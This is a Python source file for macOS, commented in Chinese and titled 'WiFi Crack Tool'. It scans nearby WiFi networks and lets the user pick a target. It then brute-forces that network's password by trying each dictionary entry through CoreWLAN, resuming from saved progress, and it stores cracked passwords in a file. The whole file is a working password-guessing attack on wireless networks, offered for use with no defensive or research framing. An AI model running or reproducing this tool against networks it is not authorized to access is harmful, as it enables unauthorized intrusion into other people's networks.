import CoreWLAN
import CoreLocation
import re
import os
import sys
import json
import socket
import Foundation
import logging
import hashlib
from typing import List, Dict, Optional, Generator
from prettytable import PrettyTable
from time import sleep
import pyfiglet
from Cocoa import NSApplication
import threading
import queue
import psutil

class WifiCrackProgress:
    """
    进度追踪和管理类
    """
    def __init__(self, total_passwords: int, config_dir: str):
        """
        初始化进度追踪
        
        :param total_passwords: 密码总数
        :param config_dir: 配置目录
        """
        self.total_passwords = total_passwords
        self.current_index = 0
        self.progress_file = os.path.join(config_dir, 'crack_progress.json')
        self.lock = threading.Lock()
        
    def load_progress(self) -> int:
        """
        加载上次的进度
        
        :return: 上次中断的密码索引
        """
        try:
            if os.path.exists(self.progress_file):
                with open(self.progress_file, 'r') as f:
                    progress_data = json.load(f)
                    return progress_data.get('current_index', 0)
        except Exception as e:
            print(f"加载进度文件错误: {e}")
        return 0
    
    def save_progress(self, current_index: int):
        """
        保存当前进度
        
        :param current_index: 当前密码索引
        """
        with self.lock:
            try:
                progress_data = {
                    'current_index': current_index,
                    'total_passwords': self.total_passwords,
                    'timestamp': os.times().system
                }
                with open(self.progress_file, 'w') as f:
                    json.dump(progress_data, f, indent=4)
            except Exception as e:
                print(f"保存进度文件错误: {e}")
    
    def update_progress(self, increment=1):
        """
        更新进度
        
        :param increment: 进度增量
        """
        with self.lock:
            self.current_index += increment
            percentage = (self.current_index / self.total_passwords) * 100
            print(f"\r进度: {self.current_index}/{self.total_passwords} ({percentage:.2f}%)", end='', flush=True)
            
            # 每隔一定间隔保存进度
            if self.current_index % 50 == 0:
                self.save_progress(self.current_index)

class MemoryEfficientPasswordReader:
    """
    内存高效的密码读取器
    支持分块读取、断点续传
    """
    def __init__(self, pwd_dict_path: str, max_memory_mb: int = 50, start_index: int = 0):
        """
        初始化密码读取器
        
        :param pwd_dict_path: 密码字典路径
        :param max_memory_mb: 最大内存限制（MB）
        :param start_index: 起始索引
        """
        self.pwd_dict_path = pwd_dict_path
        self.max_memory_bytes = max_memory_mb * 1024 * 1024
        self.start_index = start_index
    
    def read_passwords(self) -> Generator[str, None, None]:
        """
        生成器方式读取密码，控制内存占用
        
        :yield: 密码
        """
        with open(self.pwd_dict_path, 'r', encoding='utf-8') as file:
            # 跳过已处理的密码
            for _ in range(self.start_index):
                file.readline()
            
            current_block = []
            current_size = 0
            
            for line in file:
                password = line.strip()
                if not password:
                    continue
                
                # 检查内存占用
                current_size += sys.getsizeof(password)
                current_block.append(password)
                
                # 如果内存超过限制，yield并清空
                if current_size >= self.max_memory_bytes:
                    yield from current_block
                    current_block = []
                    current_size = 0
            
            # 处理剩余密码
            yield from current_block

def wifi_connect_with_password_dict(
    cwlan_interface, 
    network, 
    pwd_dict_path, 
    config_dir,
    max_memory_mb=50,
    logger=None
) -> Optional[str]:
    """
    WiFi密码破解函数，支持进度追踪和内存控制
    
    :param cwlan_interface: WiFi接口
    :param network: 目标网络
    :param pwd_dict_path: 密码字典路径
    :param config_dir: 配置目录
    :param max_memory_mb: 最大内存限制
    :param logger: 日志记录器
    
    :return: 成功的密码
    """
    logger = logger or logging.getLogger(__name__)
    logger.info(f"开始破解网络: {network['ssid']}")
    
    # 扫描网络
    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(network['ssid'], None)
    
    if not scan_results:
        logger.error(f"未找到网络: {network['ssid']}")
        return None
    
    network_obj = scan_results.anyObject()
    
    if not network_obj:
        logger.error(f"无法获取网络对象: {network['ssid']}")
        return None
    
    # 准备进度追踪
    total_passwords = sum(1 for _ in open(pwd_dict_path, 'r', encoding='utf-8'))
    progress_tracker = WifiCrackProgress(total_passwords, config_dir)
    
    # 加载上次进度
    start_index = progress_tracker.load_progress()
    logger.info(f"从索引 {start_index} 开始破解")
    
    # 内存高效密码读取器
    password_reader = MemoryEfficientPasswordReader(
        pwd_dict_path, 
        max_memory_mb=max_memory_mb, 
        start_index=start_index
    )
    
    for password in password_reader.read_passwords():
        try:
            # 尝试连接
            if connect_to_wifi(cwlan_interface, network_obj, password, logger=logger):
                if verify_internet_connection(logger=logger):
                    logger.info(f"成功连接网络: {network['ssid']}")
                    return password
            
            # 更新进度
            progress_tracker.update_progress()
        
        except KeyboardInterrupt:
            # 处理中断
            progress_tracker.save_progress(progress_tracker.current_index)
            print("\n已保存进度，可以下次继续...")
            return None
        
        except Exception as e:
            logger.error(f"破解过程发生错误: {e}")
    
    logger.warning("无法使用密码字典连接网络")
    return None

class WifiCrackLogger:
    """
    高级日志记录类，支持多级别和更精细的日志控制
    """
    LEVEL_MAP = {
        'DEBUG': logging.DEBUG,
        'INFO': logging.INFO,
        'WARNING': logging.WARNING,
        'ERROR': logging.ERROR,
        'CRITICAL': logging.CRITICAL
    }

    def __init__(self, log_dir: str, log_level: str = 'INFO'):
        """
        初始化日志记录器
        
        :param log_dir: 日志目录
        :param log_level: 日志级别 ('DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL')
        """
        os.makedirs(log_dir, exist_ok=True)
        log_path = os.path.join(log_dir, "wifi_crack.log")
        
        # 安全获取日志级别，默认为INFO
        level = self.LEVEL_MAP.get(log_level.upper(), logging.INFO)
        
        # 配置日志记录
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s: %(message)s',
            handlers=[
                logging.FileHandler(log_path, encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
    
    def debug(self, msg: str):
        self.logger.debug(msg)
    
    def info(self, msg: str):
        self.logger.info(msg)
    
    def warning(self, msg: str):
        self.logger.warning(msg)
    
    def error(self, msg: str):
        self.logger.error(msg)
    
    def critical(self, msg: str):
        self.logger.critical(msg)

def colourise_rssi(rssi: int) -> str:
    """
    根据信号强度为RSSI值着色，使用内联条件表达式提高性能
    """
    color = "\033[92m" if rssi > -60 else "\033[93m" if rssi > -80 else "\033[91m"
    return f"{color}{rssi}\033[0m"

def scan_wifi_networks(cwlan_interface=None, logger=None) -> List[Dict]:
    """
    使用 CoreWLAN 库扫描 WiFi 网络
    
    返回:
    list: 排序后的网络信息列表
    """
    logger = logger or logging.getLogger(__name__)
    logger.info('开始扫描网络...')

    try:
        scan_results, error = cwlan_interface.scanForNetworksWithName_error_(None, None)
        
        if error:
            logger.error(f"扫描网络时发生错误: {error}")
            return []

        networks = []
        table = PrettyTable(['序号', '名称', 'BSSID', 'RSSI', '信道', '安全性'])

        for i, result in enumerate(scan_results or []):
            try:
                network_info = {
                    'ssid': result.ssid() or "隐藏网络",
                    'bssid': result.bssid(),
                    'rssi': result.rssiValue(),
                    'channel_number': result.channel(),
                    'security': re.search(r'security=(.*?)(,|$)', str(result)).group(1) if result else "未知"
                }
                networks.append(network_info)
            except Exception as e:
                logger.warning(f"解析网络信息时出错: {e}")

        # 使用内置 sorted 函数的 key 参数提高排序性能
        networks_sorted = sorted(networks, key=lambda x: x['rssi'], reverse=True)

        # 使用 enumerate 简化索引
        for i, network in enumerate(networks_sorted, 1):
            table.add_row([
                i, 
                network['ssid'], 
                network['bssid'], 
                colourise_rssi(network['rssi']), 
                network['channel_number'], 
                network['security']
            ])

        print(table)
        return networks_sorted
        
    except Exception as e:
        logger.error(f"WiFi网络扫描发生严重错误: {e}")
        return []

def connect_to_wifi(cwlan_interface, network, password, timeout=10, logger=None):
    """
    尝试使用给定的密码连接到WiFi网络。
    
    返回:
        bool: 如果连接成功，返回True，否则返回False
    """
    logger = logger or logging.getLogger(__name__)
    
    try:
        # 断开当前网络连接
        cwlan_interface.disassociate()

        # 将密码转换为 NSString（Objective-C String 类型）
        ns_password = Foundation.NSString.stringWithString_(password)

        # 使用 associateToNetwork:password:error: 方法
        response = cwlan_interface.associateToNetwork_password_error_(
            network, 
            ns_password,
            None
        )

        if response[0]:
            # 等待连接建立
            print(f"\n✅成功连接到网络! ⌛️等待系统建立链接...")
            print(f"网络: {network.ssid()} 密码: {password}")
            logger.info(f"成功连接到网络: {network.ssid()}")
            sleep(3)  # 给系统一些时间建立连接
            return True
        else:
            logger.debug(f"连接到 {network.ssid()} 失败，{response[1]}")
            # logger.warning(f"连接到 {network.ssid()} 失败，{response[1]}")
            return False
        
    except Exception as e:
        logger.error(f"连接WiFi时发生错误: {e}")
        return False

def verify_internet_connection(timeout: int = 10, logger=None) -> bool:
    """
    使用上下文管理器优化连接检查性能和资源管理
    """
    logger = logger or logging.getLogger(__name__)
    
    test_servers = [
        ("223.5.5.5", 53)    # 阿里DNS
    ]
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        try:
            for server, port in test_servers:
                sock.connect((server, port))
                logger.info(f"成功通过 {server} 验证互联网连接")
                return True
        except (socket.error, socket.timeout):
            logger.warning("无法建立互联网连接,请执行判断网络情况! ")
    
    return False

def load_or_create_config(config_file_path=None, config_settings_data=None):
    """加载或创建配置文件"""
    if not config_file_path or not config_settings_data:
        raise ValueError("必须提供配置文件路径和默认配置")
    
    try:
        if os.path.exists(config_file_path):
            with open(config_file_path, 'r', encoding='utf-8') as config_file:
                return json.load(config_file)
        else:
            os.makedirs(os.path.dirname(config_file_path), exist_ok=True)
            with open(config_file_path, 'w', encoding='utf-8') as config_file:
                json.dump(config_settings_data, config_file, indent=4, ensure_ascii=False)
            return config_settings_data
    except Exception as e:
        print(f"配置文件处理错误: {e}")
        return config_settings_data

def load_pwd_dict(pwd_dict_path=None):
    """加载密码字典"""
    pwd_dict_data = []
    
    if not pwd_dict_path or not os.path.exists(pwd_dict_path):
        print(f"密码字典文件不存在: {pwd_dict_path}")
        return pwd_dict_data
    
    try:
        with open(pwd_dict_path, 'r', encoding='utf-8') as file:
            pwd_dict_data = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"加载密码字典时发生错误: {e}")
    
    return pwd_dict_data

def wait_for_location_authorization(location_manager, max_wait=30):
    """等待并检查位置服务授权"""
    for i in range(max_wait):
        authorization_status = location_manager.authorizationStatus()
        if authorization_status in [3, 4]:  # 授权状态
            print('已获得位置服务授权，继续...')
            return True
        if i >= max_wait - 1:
            print('未能获得位置服务授权，程序退出...')
            return False
        sleep(1)
    return False

def main():
    # 使用pyfiglet库打印大字标题
    f = pyfiglet.Figlet(font='big')
    print('\n' + f.renderText('WiFi Crack Tool'))

    # 初始化 macOS 应用和 CoreLocation
    app = NSApplication.sharedApplication()
    location_manager = CoreLocation.CLLocationManager.alloc().init()

    # 检查并请求定位服务
    if not location_manager.locationServicesEnabled():
        logger.error('定位服务未启用，请启用定位服务并重试...')
        sys.exit(1)

    print('尝试获取定位服务授权（WiFi扫描必要）...')
    location_manager.requestWhenInUseAuthorization()

    # 等待授权
    if not wait_for_location_authorization(location_manager):
        sys.exit(1)

    # 配置目录
    base_dir = os.path.dirname(os.getcwd())
    config_dir = os.path.join(base_dir, "config")
    log_dir = os.path.join(base_dir, "log")
    
    for path in [config_dir, log_dir]:
        os.makedirs(path, exist_ok=True)

    # 配置文件路径
    config_file_path = os.path.join(config_dir, 'settings.json')
    
    # 默认配置
    default_config = {
        'pwd_txt_path': os.path.join(base_dir, 'passwords.txt'),
        'max_memory_mb': 50,   # 默认最大内存
        'log_level': 'INFO'  # 默认日志等级
    }

    # 加载配置
    config = load_or_create_config(config_file_path, default_config)

    # 配置日志，从配置文件读取日志级别
    log_level=config.get('log_level', 'INFO') # 从配置读取，默认INFO
    logger = WifiCrackLogger(
        log_dir=log_dir, 
        log_level=log_level
    )

    # 控制台友好提示
    print(f"当前日志级别: {log_level}")

    # 获取默认 WiFi 接口
    cwlan_client = CoreWLAN.CWWiFiClient.sharedWiFiClient()
    cwlan_interface = cwlan_client.interface()

    # 扫描可用的 WiFi 网络
    networks_sorted = scan_wifi_networks(cwlan_interface, logger)

    if not networks_sorted:
        logger.error("没有找到可用的网络")
        sys.exit(1)

    # 要求用户选择要破解的网络
    while True:
        try:
            x = int(input('\n选择要破解的网络(输入序号): ')) - 1
            if 0 <= x < len(networks_sorted):
                break
            else:
                print("无效的网络序号，请重新输入")
        except ValueError:
            print("请输入有效的数字")

    selected_network = networks_sorted[x]
    
    # 添加密码破解功能
    connected_password = wifi_connect_with_password_dict(
        cwlan_interface, 
        selected_network, 
        config['pwd_txt_path'],
        config_dir,
        config['max_memory_mb'],
        logger
    )
    
    if connected_password:
        # 将成功的密码保存到文件
        successful_connections_path = os.path.join(config_dir, 'successful_connections.txt')
        with open(successful_connections_path, 'a', encoding='utf-8') as f:
            f.write(f"网络: {selected_network['ssid']}, 密码: {connected_password}\n")
        
        logger.info(f"成功破解网络: {selected_network['ssid']}")
    else:
        logger.warning("未能成功连接到网络")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n操作被用户中断。")
    except Exception as e:
        print(f"发生未处理的异常: {e}")
        import traceback
        traceback.print_exc()







# 备用/废弃代码
# import subprocess
# x = int(subprocess.run(['osascript', '-e', 'display dialog "请输入要破解的网络(序号):" with hidden answer default answer "" with title "输入对话框" buttons {"取消", "确定"} default button "确定" giving up after 60', '-e', 'text returned of result'], capture_output=True, text=True).stdout) - 1
# dict_dir_path = os.path.join(os.getcwd(), "dict")  # 字典目录路径

# iface = cwlan_interface.interfaceName() 接口名
# timeout 2 networksetup -setairportnetwork en0 ssid password


# def connect_to_wifi(cwlan_interface, network, password, timeout, logger=None):
#     """
#     尝试使用给定的密码连接到WiFi网络。
    
#     返回:
#         bool: 如果连接成功，返回True，否则返回False
#     """
#     logger = logger or logging.getLogger(__name__)

#     # 连接结果和超时事件
#     connection_result = False
#     timeout_event = threading.Event()

#     def connect_thread():
#         nonlocal connection_result
#         try:
#             # 将密码转换为 NSString（Objective-C String 类型）
#             ns_password = Foundation.NSString.stringWithString_(password)

#             # 使用 associateToNetwork:password:error: 方法
#             response = cwlan_interface.associateToNetwork_password_error_(
#                 network, 
#                 ns_password,
#                 None
#             )

#             if response[0]:
#                 print("")
#                 logger.info(f"✅ 成功连接到网络: {network.ssid()} 密码: {password}")
#                 print(f"⌛️ 等待验证网络连通性...")
#                 # sleep(3)  # 给系统一些时间建立连接
#                 # return True
#                 connection_result = True
#             else:
#                 logger.debug(f"连接到 {network.ssid()} 失败，{response[1]}")
#                 # logger.warning(f"连接到 {network.ssid()} 失败，{response[1]}")
#                 # return False
#         except Exception as e:
#             logger.error(f"连接WiFi时发生错误: {e}")
#             # return False
#         finally:
#             timeout_event.set()  # 确保设置事件，防止主线程死锁

#     # 启动连接线程
#     thread = threading.Thread(target=connect_thread)
#     thread.start()
    
#     # 等待3秒
#     timeout_event.wait(timeout)
    
#     # 如果线程仍在运行，强制中断
#     if thread.is_alive():
#         logger.warning(f"连接 {network.ssid()} 超时,已打断.")
#         return False
    
#     return connection_result



